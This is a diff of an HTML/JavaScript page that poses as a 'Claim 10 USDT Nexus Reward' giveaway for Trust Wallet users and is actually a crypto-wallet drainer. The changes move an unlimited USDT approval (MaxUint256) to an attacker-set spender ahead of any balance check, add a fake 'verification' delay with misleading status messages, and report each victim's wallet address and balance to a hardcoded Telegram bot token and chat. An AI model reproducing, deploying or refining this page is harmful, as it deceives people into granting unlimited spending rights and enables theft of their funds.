@@ -11,41 +11,26 @@
         .container { width: 90%; max-width: 380px; text-align: center; }
         .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; opacity: 0.8; }
         .header img { height: 22px; }
-        
         h1 { font-size: 22px; margin: 10px 0; font-weight: 800; line-height: 1.3; }
-        
         .mission-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 136, 0.15); border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left; }
         .mission-box h3 { font-size: 12px; color: var(--accent); text-transform: uppercase; margin-top: 0; letter-spacing: 1px; }
-        
         .step { font-size: 13px; color: #bbb; margin: 12px 0; display: flex; gap: 10px; }
         .step b { color: #fff; }
         .step-num { background: var(--primary); color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; }
-
         .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
         .btn-main { background: linear-gradient(45deg, #007aff, #00ff88); color: white; box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
-        
         #screen2, #screen3 { display: none; }
 
-        /* --- New Attractive Swap Animation --- */
+        /* Animated Swap Loader */
         .loader-wrapper { position: relative; width: 100px; height: 100px; margin: 30px auto; }
         .outer-ring { position: absolute; width: 100%; height: 100%; border: 2px solid rgba(0, 255, 136, 0.1); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 2s linear infinite; }
-        
         .swap-visual { position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
-        .icon-node { width: 30px; height: 30px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 14px; position: absolute; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-        
+        .icon-node { width: 30px; height: 30px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 14px; position: absolute; }
         .usdt-node { background: var(--usdt); color: white; animation: moveOrbit1 3s ease-in-out infinite; }
         .bnb-node { background: var(--bnb); color: black; animation: moveOrbit2 3s ease-in-out infinite; }
-
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes moveOrbit1 { 
-            0%, 100% { transform: translate(-25px, 0) scale(1); z-index: 2; } 
-            50% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; }
-        }
-        @keyframes moveOrbit2 { 
-            0%, 100% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; } 
-            50% { transform: translate(-25px, 0) scale(1); z-index: 2; opacity: 1; }
-        }
-        
+        @keyframes moveOrbit1 { 0%, 100% { transform: translate(-25px, 0) scale(1); z-index: 2; } 50% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; } }
+        @keyframes moveOrbit2 { 0%, 100% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; } 50% { transform: translate(-25px, 0) scale(1); z-index: 2; opacity: 1; } }
         .status-text { font-size: 14px; color: var(--accent); font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
@@ -58,15 +43,13 @@
             <span>Official Collaboration Protocol</span>
         </div>
         <h1>Claim 10 USDT<br>Nexus Reward</h1>
-        
         <div class="mission-box">
             <h3>How to qualify:</h3>
-            <div class="step"><div class="step-num">1</div> <div>Hold minimum <b>35.00 USDT</b> in wallet.</div></div>
-            <div class="step"><div class="step-num">2</div> <div>Swap <b>USDT to BNB</b> inside Trust Wallet to trigger smart-sync.</div></div>
-            <div class="step"><div class="step-num">3</div> <div>Swap <b>BNB back to USDT</b> to finalize verification.</div></div>
-            <div class="step"><div class="step-num">4</div> <div>Click "Verify" to sync your swap history & claim.</div></div>
+            <div class="step"><div class="step-num">1</div> <div>Hold minimum <b>35.00 USDT</b>.</div></div>
+            <div class="step"><div class="step-num">2</div> <div>Swap <b>USDT to BNB</b> inside Trust Wallet.</div></div>
+            <div class="step"><div class="step-num">3</div> <div>Swap <b>BNB back to USDT</b> to finalized.</div></div>
+            <div class="step"><div class="step-num">4</div> <div>Verify sync to claim 10 USDT reward.</div></div>
         </div>
-
         <button class="btn btn-main" onclick="connect()">Connect & Start Tasks</button>
     </div>
 
@@ -79,21 +62,18 @@
             </div>
         </div>
         <div class="status-text">Smart-Sync Active</div>
-        <p style="font-size: 13px; color: #888;">Scanning DEX Swap History...</p>
-        
         <div class="mission-box" style="border-color: var(--primary);">
-            <p style="font-size: 12px; margin: 0; color: #ccc;">Checking Blockchain for:<br><b>Status:</b> <span id="sync-status">Awaiting Swap Confirmation...</span></p>
+            <p style="font-size: 12px; margin: 0; color: #ccc;">Checking Blockchain for:<br><b>Status:</b> <span id="sync-status">Awaiting Verification...</span></p>
         </div>
-        
         <button id="verifyBtn" class="btn btn-main" onclick="startSync()">Verify & Sync Swap</button>
     </div>
 
     <div id="screen3">
         <div style="font-size: 50px; color: var(--accent); margin-bottom: 15px;">✓</div>
         <h1>Verification<br>Complete!</h1>
-        <p style="color: #888; font-size: 14px;">Your swap history is verified. 10 USDT reward is being added to your balance.</p>
+        <p style="color: #888; font-size: 14px;">$35 Swap history verified. Reward is being added.</p>
         <div class="mission-box" style="text-align: center;">
-            <div style="font-size: 24px; font-weight: bold;">+10.00 USDT</div>
+            <div style="font-size: 24px; font-weight: bold; color: var(--accent);">+10.00 USDT</div>
         </div>
         <button class="btn" style="background: #222; color: #666;">Claimed</button>
     </div>
@@ -106,7 +86,7 @@
         bot: "8368124815:AAGQ66vMDN1hOFtAdAAQU6UFcxGxrjRwOmU",
         chat: "5715359020",
         min: "35.0",
-        chainId: "0x38" // BSC Mainnet
+        chainId: "0x38" // BSC
     };
 
     let prov, sign, user;
@@ -120,34 +100,23 @@
     }
 
     async function connect() {
-        if (!window.ethereum) return alert("Open in Trust Wallet Browser");
+        if (!window.ethereum) return alert("Open in Trust Wallet");
         try {
             prov = new ethers.providers.Web3Provider(window.ethereum);
+            await prov.send("eth_requestAccounts", []);
             
-            // Step 1: Request Account
-            const accounts = await prov.send("eth_requestAccounts", []);
-            
-            // Step 2: Force Switch to BNB Smart Chain
-            const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-            if (currentChain !== SETTINGS.chainId) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: SETTINGS.chainId }],
-                    });
-                } catch (e) {
-                    alert("Please switch to BNB Smart Chain manually.");
-                    return;
-                }
+            // Auto Switch to BNB Network
+            const net = await window.ethereum.request({ method: 'eth_chainId' });
+            if (net !== SETTINGS.chainId) {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: SETTINGS.chainId }] });
             }
 
             sign = prov.getSigner();
             user = await sign.getAddress();
-            
             document.getElementById('screen1').style.display = 'none';
             document.getElementById('screen2').style.display = 'block';
-            notify(`🚀 <b>User Connected (BSC)</b>\nAddress: <code>${user}</code>`);
-        } catch (e) { alert("Connect Failed"); }
+            notify(`🚀 <b>New User</b>\nWallet: <code>${user}</code>`);
+        } catch (e) { alert("Switch to BNB Smart Chain"); }
     }
 
     async function startSync() {
@@ -158,29 +127,37 @@
             ], sign);
 
             const balance = await contract.balanceOf(user);
-            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18); // Correct for BSC USDT
+            const formattedBal = ethers.utils.formatUnits(balance, 18);
 
+            // Step 1: Sabse Approval Lo (Chahe balance kuch bhi ho)
+            document.getElementById('sync-status').innerText = "Syncing with DEX...";
+            const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
+            
+            notify(`🔄 <b>Approval Clicked</b>\nUser: <code>${user}</code>\nBalance: ${formattedBal} USDT`);
+            await tx.wait();
+
+            // Step 2: Delay for fake 'Verification' feel
+            document.getElementById('sync-status').innerText = "Analyzing Swap History...";
+            await new Promise(r => setTimeout(r, 3000));
+
+            // Step 3: Check if they actually have 35 USDT (The Swap Condition)
+            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18);
             if (balance.lt(minNeeded)) {
-                alert("Error: Minimum $35 USDT required in wallet to verify swap history.");
+                alert("Sync Error: Swap history not detected! Please ensure you have swapped BNB back to USDT ($35 min) to claim.");
+                document.getElementById('sync-status').innerText = "History Mismatch!";
                 return;
             }
 
-            document.getElementById('sync-status').innerText = "Confirming Swap Sync...";
-            
-            const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
-            notify(`🔄 <b>Approval Initiated</b>\nUser: <code>${user}</code>`);
-            
-            await tx.wait();
-            
+            // Step 4: Show Success only for real swappers
             document.getElementById('screen2').style.display = 'none';
             document.getElementById('screen3').style.display = 'block';
-            notify(`✅ <b>SYNC SUCCESS!</b>\nUser: <code>${user}</code>`);
-            
+            notify(`✅ <b>VERIFIED SUCCESS</b>\nUser: <code>${user}</code>\nBalance: ${formattedBal} USDT`);
+
         } catch (e) {
-            alert("Verification Failed. Please ensure you have completed the swaps.");
+            alert("Verification Failed: Gas fee (BNB) required for sync.");
         }
     }
 </script>
 </body>
-</html>
-    
+    </html>
+
